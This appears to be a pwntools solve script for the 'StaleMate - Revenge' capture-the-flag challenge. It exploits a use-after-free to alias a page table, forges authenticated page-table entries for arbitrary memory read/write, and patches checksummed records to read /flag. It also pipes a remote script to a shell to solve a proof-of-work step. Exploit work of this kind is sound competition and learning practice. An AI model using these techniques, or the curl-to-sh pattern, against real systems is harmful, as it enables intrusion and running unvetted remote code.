#!/usr/bin/env python3
# StaleMate - Revenge  exploit  --  reads /flag via "claim record"
#
# Bug (StaleMate): "drop pipe" frees a pipe's backing page back to the buddy
# allocator while a "mirror pipe" view still references that page index. The
# next allocation ("open workspace") reuses that same physical page as the new
# workspace's ROOT page table, so the mirror view now ALIASES the page table:
#   - trace packet  -> raw read  of page-table entries
#   - send packet   -> raw write of a forged page-table entry
#
# Page-table entries are (value, mac) pairs.  value decodes to a phys addr via
#   base = rol( smix((level<<12) ^ (index<<32) ^ C0) + k0 , cl ) ;  addr = base ^ value
#   mac  = ( smix(value ^ (index<<32) ^ level ^ C1) + k1 + addr ) ^ rol(k0,23)
# We leak the per-ctx keys k0,k1 from the legit ROOT entry (the L1-table page,
# perms 0xa19), then forge a self-referencing page table to obtain arbitrary
# physical read/write over the 0x400-page pool.
#
# Win (claim record): validates a 5-record chain (voucher A -> B -> C -> D1,D2)
# protected by per-record checksums plus a final integrity hash.  The init
# builds an almost-valid chain that fails two capability checks.  With the R/W
# primitive we set the missing bits in record C and D2, recompute every
# affected record checksum + the final hash, and "claim record" opens /flag.

import importlib.util, re, sys
from pwn import *

D="/mnt/d/Documents/CTF_competition/V1T CTF 2026/Pwn/StaleMate - Revenge"
def load(name,path):
    s=importlib.util.spec_from_file_location(name,path); m=importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
model =load("model", D+"/_model.py")
H     =load("hashes",D+"/_hashes.py")
M=(1<<64)-1
B1=0xbf58476d1ce4e5b9; B2=0x94d049bb133111eb

def parity(addr,index,level):
    pfn=(addr>>0xc)&M
    rsi=((index<<5)^(level<<2))&M
    rsi^=((pfn<<0x11)&0x1fffffffe0000)
    rsi^=(addr&0xf); rsi^=0x2b992ddfa23249d6; rsi&=M
    v=rsi; v=((v>>0x1e)^v)&M; v=(v*B1)&M; v=((v>>0x1b)^v)&M; v=(v*B2)&M
    return (((v>>0x1f)^((addr>>4)^v))&0xff)

def pick_addr(pfn,index,level,reqbits):
    for pr in range(0x1000):
        if (pr&reqbits)!=reqbits: continue
        addr=(pfn<<12)|pr
        if parity(addr,index,level)==0:
            return addr
    raise RuntimeError("no perms pfn=%d idx=%d lvl=%d"%(pfn,index,level))

context.log_level="info"
def solve_pow(io):
    # server: "curl -sSfL https://pwn.red/pow | sh -s <challenge>"
    line = io.recvline_contains(b"pwn.red/pow").decode()
    chal = line.split("-s ", 1)[1].strip()
    sol = subprocess.check_output(
        ["sh", "-c", f"curl -sSfL https://pwn.red/pow | sh -s {chal}"]
    ).strip()
    io.sendlineafter(b"solution: ", sol)

def conn():
    if args.REMOTE:
        io = remote(args.HOST, int(args.PORT))
        solve_pow(io)
        return io
    return process([exe])

p = conn()

def menu(n):
    p.recvuntil(b"> "); p.sendline(str(n).encode())
def reg(i,s):
    menu(1); p.sendlineafter(b"id: ",str(i).encode()); p.sendlineafter(b"slots: ",str(s).encode()); p.recvline()
def mirror(i):
    menu(2); p.sendlineafter(b"id: ",str(i).encode()); return int(re.search(rb"view=(\d+)",p.recvline()).group(1))
def drop(i):
    menu(3); p.sendlineafter(b"id: ",str(i).encode()); p.recvline()
def ws():
    menu(6); return int(re.search(rb"ws=(\d+)",p.recvline()).group(1))
def attach(w,sh):
    menu(7); p.sendlineafter(b"ws: ",str(w).encode()); p.sendlineafter(b"shelf: ",str(sh).encode()); return p.recvline()
def trace(view,slot):
    menu(5); p.sendlineafter(b"view: ",str(view).encode()); p.sendlineafter(b"slot: ",str(slot).encode())
    mm=re.search(rb"x=0x([0-9a-f]+) y=0x([0-9a-f]+)",p.recvline())
    return (int(mm.group(1),16),int(mm.group(2),16)) if mm else None
def sendpkt(view,slot,x,y):
    menu(4); p.sendlineafter(b"view: ",str(view).encode()); p.sendlineafter(b"slot: ",str(slot).encode())
    p.sendlineafter(b"x: ",str(x).encode()); p.sendlineafter(b"y: ",str(y).encode()); p.recvline()
def fetch(w,addr,length):
    menu(8); p.sendlineafter(b"ws: ",str(w).encode()); p.sendlineafter(b"addr: ",str(addr).encode()); p.sendlineafter(b"len: ",str(length).encode())
    l=p.recvline(); hx=re.findall(rb"[0-9a-f]{2}",l)
    return bytes(int(h,16) for h in hx[:length]) if len(hx)>=length else l
def store(w,addr,payload):
    menu(9); p.sendlineafter(b"ws: ",str(w).encode()); p.sendlineafter(b"addr: ",str(addr).encode())
    p.sendlineafter(b"len: ",str(len(payload)).encode()); p.sendlineafter(b"hex: ",payload.hex().encode()); p.recvline()

# ---------- stage 1: alias the page table & leak ctx keys ----------
reg(5,256); V=mirror(5); drop(5); W=ws(); attach(W,0)
datslot=val0=mac0=None
for s in range(256):
    r=trace(V,s)
    if r and (r[0] or r[1]):
        datslot,(val0,mac0)=s,r; break
assert datslot is not None,"no aliased PTE"
ROOT_ADDR=(24<<12)|0xa19              # legit root entry -> L1 table page 24
k0=model.recover_k0(datslot,0,val0,ROOT_ADDR)
k1=model.recover_k1(k0,datslot,0,val0,ROOT_ADDR,mac0)
a,_,ok=model.decode(k0,k1,datslot,0,val0,mac0)
assert ok and a==ROOT_ADDR,"key recovery failed"
log.success("keys k0=0x%x k1=0x%x"%(k0,k1))

# ---------- stage 2: self-referencing page table => arbitrary phys R/W ----------
IROOT,JLEAF=0x10,0x20
root_addr=pick_addr(23,IROOT,0,0b1001)            # root entry -> page23 itself
rv,rm=model.encode(k0,k1,IROOT,0,root_addr); sendpkt(V,IROOT,rv,rm)
VA=(IROOT<<0x14)|(JLEAF<<0xc)
def map_leaf(pfn,write):
    addr=pick_addr(pfn,JLEAF,1,0b111 if write else 0b011)
    lv,lm=model.encode(k0,k1,JLEAF,1,addr); sendpkt(V,JLEAF,lv,lm)
def aread(pfn,off,n):
    map_leaf(pfn,False); return fetch(W,VA+off,n)
def awrite(pfn,off,payload):
    map_leaf(pfn,True);  store(W,VA+off,payload)

# ---------- stage 3: read records, patch fields, fix all checksums ----------
# records: A=voucher(page8 off0x120,0x30) B(page9 off0x260,0x30) C(page10 off0x90,0x40)
#          D1(page11 off0x330,0x28) D2(page12 off0x1d0,0x30)
RECS={"A":(8,0x120,0x30),"B":(9,0x260,0x30),"C":(10,0x90,0x40),"D1":(11,0x330,0x28),"D2":(12,0x1d0,0x30)}
rec={n:bytearray(aread(pf,of,sz)) for n,(pf,of,sz) in RECS.items()}

# sanity: verify our hash model matches the stored checksums on the unpatched chain
chk={"A":(0x28,H.h28d0),"B":(0x28,H.h2950),"C":(0x38,H.h29d0),"D1":(0x20,H.h2a60),"D2":(0x28,H.h2ad0)}
for n,(o,fn) in chk.items():
    got=int.from_bytes(rec[n][o:o+8],"little"); calc=fn(bytes(rec[n]))
    log.info("checksum %s stored=0x%016x calc=0x%016x %s"%(n,got,calc,"OK" if got==calc else "MISMATCH"))

def setq(n,off,val):
    rec[n][off:off+8]=p64(val)

# capability bit patches
setq("C",0x20, int.from_bytes(rec["C"][0x20:0x28],"little") | 0x2004000)
new_a0=int.from_bytes(rec["D2"][0x10:0x18],"little") | 0x8000000000002491
setq("D2",0x10, new_a0)

# final integrity hash inputs (post-patch)
# var_18 is loaded by the binary from rsp+0x18, which lands inside record D1
# (stack layout: D1@0x00, A@0x30, B@0x60, D2@0x90, C@0xc0). Only low 32 bits used.
var_18=int.from_bytes(rec["D1"][0x18:0x1c],"little")
var_40=int.from_bytes(rec["A"][0x10:0x18],"little")
var_80=int.from_bytes(rec["B"][0x20:0x28],"little")
var_b0=int.from_bytes(rec["D2"][0x20:0x28],"little")
var_f0=int.from_bytes(rec["C"][0x30:0x38],"little")
final=H.final_hash(var_18,var_40,var_80,new_a0,var_b0,var_f0)
setq("A",0x18, final)

# recompute every affected per-record checksum
setq("C",0x38, H.h29d0(bytes(rec["C"])))
setq("D2",0x28,H.h2ad0(bytes(rec["D2"])))
setq("A",0x28, H.h28d0(bytes(rec["A"])))   # A changed (0x18 + 0x28)

# write everything back
awrite(10,0x90 +0x20, bytes(rec["C"][0x20:0x28]))
awrite(10,0x90 +0x38, bytes(rec["C"][0x38:0x40]))
awrite(12,0x1d0+0x10, bytes(rec["D2"][0x10:0x18]))
awrite(12,0x1d0+0x28, bytes(rec["D2"][0x28:0x30]))
awrite(8, 0x120+0x18, bytes(rec["A"][0x18:0x20]))
awrite(8, 0x120+0x28, bytes(rec["A"][0x28:0x30]))

# ---------- stage 4: claim the record ----------
menu(13)
out=p.recvall(timeout=3)
sys.stdout.write(out.decode(errors="replace"))
mm=re.search(rb"v1t\{[^}]*\}",out) or re.search(rb"[A-Za-z0-9_]+\{[^}]*\}",out)
if mm: log.success("FLAG: %s"%mm.group(0).decode())
else:  log.failure("no flag")
p.close()
